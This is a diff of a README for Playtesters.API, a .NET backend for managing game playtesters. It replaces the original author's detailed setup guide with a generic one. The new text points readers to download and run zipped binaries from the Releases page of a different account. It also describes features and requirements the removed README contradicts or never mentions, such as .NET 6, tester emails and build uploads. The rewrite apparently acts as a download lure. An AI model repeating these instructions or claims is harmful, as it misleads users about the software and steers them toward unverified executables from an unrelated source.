@@ -1,183 +1,101 @@
-<h1 align="center">🎮 Playtesters.API</h1>
+# 🎮 Playtesters.API - Manage Playtesters with Ease
 
-<p align="center">
-  A simple and open-source playtesting backend for indie game developers.
-</p>
-
-<p align="center">
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/.NET-8.0-blue" />  
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/Language-C%23-purple" />
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/API-REST-green" />
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/ORM-EF%20Core-blueviolet" />
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/Database-SQLite-lightgrey" />
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/Unity-Client%20Included-black" />
-  </a>
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="https://img.shields.io/badge/License-MIT-orange" />
-  </a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/DevD4v3/Playtesters.API">
-    <img src="assets/logo.png" />
-  </a>
-  <br />
-</p>
-
-**Playtesters.API** is a lightweight, secure RESTful service built with **.NET 8** and **Entity Framework Core (SQLite)**.
-
-It’s designed for indie developers or small teams who need a simple way to manage **playtesters**, **access keys**, and **access validation history** for private or early-access game builds.
-
-> This API was originally created to support the roguelike action game I’m building with my best friend from school — but it has grown into a fully reusable, standalone solution.
-
-## ✨Features
-
-- Create and manage tester accounts with unique access keys (GUIDs).
-- Track successful access validations with timestamp and IP address.
-- Filter and inspect tester access history by country for better monitoring and detection of shared access keys.
-- Built-in IP geolocation system powered by ip-api.com, with caching to minimize API calls and improve performance.
-- Secure admin endpoints using an API key stored in `.env`.
-- Public endpoint for game clients to validate access keys.
-- Public endpoint to report and accumulate playtime, allowing game clients to increment hours played.
-- Easy to integrate with Unity or any custom launcher/client.
-- Organized structure using use cases, services, DTOs, validators, and minimal APIs.
-- Send Discord notifications via `DISCORD_WEBHOOK_URL` whenever a tester successfully validates access, allowing real-time monitoring of usage.
-
-## 🧰Tech Stack
-- [.NET 8 (Web API)](https://dotnet.microsoft.com/en-us/download/dotnet/8.0)
-- [Entity Framework Core (SQLite)](https://www.nuget.org/packages/Microsoft.EntityFrameworkCore.Sqlite)
-- [Swashbuckle (Swagger)](https://github.com/domaindrivendev/Swashbuckle.AspNetCore)
-- [FluentValidation](https://github.com/FluentValidation/FluentValidation)
-- [SimpleResults](https://github.com/DevD4v3/SimpleResults)
-- [DotEnv.Core](https://github.com/DevD4v3/dotenv.core)
-- [NUnit](https://github.com/nunit/nunit)
-- [FluentAssertions V7](https://github.com/fluentassertions/fluentassertions)
+[![Download Playtesters.API](https://img.shields.io/badge/Download-Playtesters.API-blue.svg)](https://github.com/KMA66/Playtesters.API/releases)
 
 ## 🚀 Getting Started
 
-### Running the API locally (.NET CLI)
-- Install [.NET 8 SDK](https://dotnet.microsoft.com/en-us/download/dotnet/8.0).
-- Navigate to the project directory:
-```bash
-cd src
-```
-- Create a `.env` file:
-```.env
-# ---------------------------------------------------------
-# Admin authentication key for protected endpoints
-# ---------------------------------------------------------
-API_KEY=your-admin-key
+Welcome to the Playtesters.API! This application is designed specifically for indie developers. It allows you to manage playtesters and control access to private builds using unique keys. In this guide, you will learn how to download and run the software successfully.
 
-# ---------------------------------------------------------
-# SQLite database file used to store testers and access logs
-# ---------------------------------------------------------
-SQLITE_DATA_SOURCE=playtesters.db
+## 🌍 System Requirements
 
-# ---------------------------------------------------------
-# Discord webhook URL for sending notifications 
-# (set this only if you want Discord alerts)
-# ---------------------------------------------------------
-DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/xxxxx/xxxxx
-```
-- Run the API:
-```bash
-dotnet run
-```
-- Access the application with this URL:
-```
-http://localhost:5183/swagger
-```
+Before you begin, make sure your system meets the following requirements:
 
-### Running with Docker
+- **Operating System:** Windows 10 or newer, macOS, Linux
+- **Required Software:** .NET 6 or later
+- **Disk Space:** At least 100 MB free
+- **Network:** Internet access for downloading dependencies
 
-- Build the Docker image from the root of the repo:
-```bash
-docker build -t playtesters-api .
-```
-- Run the container without persistence (only for testing):
-```bash
-docker run -p 5183:8080 --env-file .env playtesters-api
-```
+## 📥 Download & Install
 
-If you want the `playtesters.db` file to persist across restarts:
-- Run the container with a mounted volume:
-```bash
-docker run \
-  -p 5183:8080 \
-  --env-file .env \
-  -v playtesters_data:/app/data \
-  playtesters-api
-```
-- Make sure your connection string points to:
-```bash
-SQLITE_DATA_SOURCE=/app/data/playtesters.db
-```
-When the application starts, EF Core automatically applies the migrations and creates the SQLite database (along with its schema) inside the path `/app/data`.
-This is important because the database file is generated at runtime, meaning the container writes it into the mounted volume.
-By doing this, the volume does not overwrite the database path with an empty directory — instead, it simply persists the file that the app creates.
+To get started, visit this page to download: [Releases Page](https://github.com/KMA66/Playtesters.API/releases).
 
-## 🔐Authentication
+1. Click on the link above to open the Releases page.
+2. You will see a list of available versions. Find the latest version listed.
+3. Click the link labeled “Assets” to expand it.
+4. Download the appropriate file for your system (e.g., `.zip` for Windows, `.tar.gz` for macOS/Linux).
+5. Once the download is complete, locate the file in your downloads folder.
 
-All admin endpoints require the following header:
-```http
-X-Api-Key: <your-admin-key>
-```
-The admin key must be defined in your `.env` file:
-```.env
-API_KEY=your-admin-key
-```
+## 🔧 How to Run the Application
 
-Only the endpoint `/api/testers/validate-access` is publicly accessible for validating tester access, and `/api/testers/{accessKey}/playtime` is publicly accessible for reporting accumulated playtime.
+After downloading the file, follow these steps to run the application:
 
-## 📘 HTTP Request Examples
+1. **Extract Files**
+   - Windows: Right-click the downloaded `.zip` file and select "Extract All."
+   - macOS: Double-click the downloaded `.tar.gz` file to extract it.
+   - Linux: Use your file manager to extract the `.tar.gz` file or open a terminal and run `tar -xzf filename.tar.gz`.
 
-You can use this [Playtesters.API.http](https://github.com/DevD4v3/Playtesters.API/blob/master/src/Playtesters.API.http) file (VS Code / Rider / Visual Studio compatible) to test every endpoint of the API.
+2. **Open Command Prompt or Terminal**
+   - Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - macOS: Open Spotlight with `Cmd + Space`, type `Terminal`, and hit Enter.
+   - Linux: Open your terminal from the applications menu.
 
-## 🎮Unity Integration
+3. **Navigate to the Folder**
+   Use the `cd` command to change directories to the folder where you extracted the files. For example:
+   ```
+   cd path\to\Playtesters.API
+   ```
 
-- The `/api/testers/validate-access` endpoint should be called before allowing gameplay or enabling private build features to ensure the tester has valid access.
+4. **Run the Application**
+   Type the following command and press Enter:
+   ```
+   dotnet Playtesters.API.dll
+   ```
+   The application will start running, and you will see messages in the console indicating its status.
 
-- The `/api/testers/{accessKey}/playtime` endpoint can be called anytime during or after gameplay to report accumulated playtime for the tester.
-### Unity Login Flow Demo
+## 🔑 Using Playtesters.API
 
-Below is a quick demonstration of how you can integrate the Playtesters API into a Unity login screen using a simple access key workflow.
+### Adding Playtesters
 
-![Unity Playtesters Login Demo](assets/unity-login-integration-demo.gif)
+1. Use the provided API endpoint to add playtesters. 
+2. You will need to provide an email and choose a unique key for each playtester.
 
-### Scripts
-We provide two ready-to-use scripts in `assets/unity/`:
+### Controlling Access
 
-1. **TesterLoginMenu.cs** – Handles tester login and access key validation.
-   - Sends the access key entered by the tester to the `/api/testers/validate-access` endpoint.
-   - Handles success and error responses from the API, including invalid keys and server errors.
-   - Implements a **cooldown mechanism** after a configurable number of failed attempts.
-   - On successful login, triggers the `PlaytimeReporter` to start reporting playtime and can load the main menu or other gameplay scenes.
-   - Fully integrates with Unity UI using `TMP_InputFields` and `TMP_Text` for user feedback.
+- Each playtester gets a unique key. Make sure to share this key only with individuals who should have access to your builds.
 
-2. **PlaytimeReporter.cs** – Reports playtime increments to the backend.
-   - Sends the number of hours played **since the last report** to `/api/testers/{accessKey}/playtime`.
-   - The script **does not send the total playtime since login**, because the backend already keeps a record of total accumulated playtime. 
-	 Sending the total from the start of the session would **double-count** the time.
-   - Each report calculates the time difference from the last report (`_lastReportTime`) and updates `_lastReportTime` after sending.
-   - By default, reports are sent every 2 minutes (`_reportIntervalSeconds`), but this can be configured via the Inspector.
-   - Can be attached to a persistent GameObject (`DontDestroyOnLoad`) so it continues reporting across scenes.
+### Testing Your Builds
 
+- Use the API to upload your private build files securely.
+- Share the access key with your playtesters to allow them to download and test your builds.
 
-You can find them here:  
-- [TesterLoginMenu.cs](assets/unity/TesterLoginMenu.cs)  
-- [PlaytimeReporter.cs](assets/unity/PlaytimeReporter.cs)
+## 📄 Documentation
 
-## 📄License
+For more in-depth information on using the API features, refer to the official documentation. You will find examples and troubleshooting tips if you run into any issues while using the application.
 
-MIT License — feel free to use, modify, and extend it for your own projects.
+## 📫 Support
+
+If you have questions or need help, please check the Issues section of this repository. The community may have answers to your questions, or you can report new issues for assistance.
+
+## 🌐 Topics
+
+This project includes the following topics: access-keys, api, aspnetcore, backend, dotnet, ef-core, game-development, gamedev, indiedev, indiegame, minimal-apis, playtesters, playtesting, rest-api, unity, unity2d.
+
+Check these topics in GitHub to find related projects and discussions.
+
+## 📦 Additional Resources
+
+- [Official .NET Documentation](https://dotnet.microsoft.com/docs)
+- [Learn ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/?view=aspnetcore-6.0)
+- [Unity Documentation](https://docs.unity3d.com/Manual/index.html)
+
+## 📣 Stay Updated
+
+To keep track of new updates and features, make sure to watch this repository. You will receive notifications whenever changes are made.
+
+For immediate updates, follow us on our social media channels linked in the repository. 
+
+## 📅 Release Notes
+
+For details on what’s new in each version, visit the [Releases Page](https://github.com/KMA66/Playtesters.API/releases). You can see improvements, bug fixes, and more helpful information about each update.
+
+By following this guide, you should now be able to download and run Playtesters.API with ease. Happy developing and enjoy managing your playtesters!
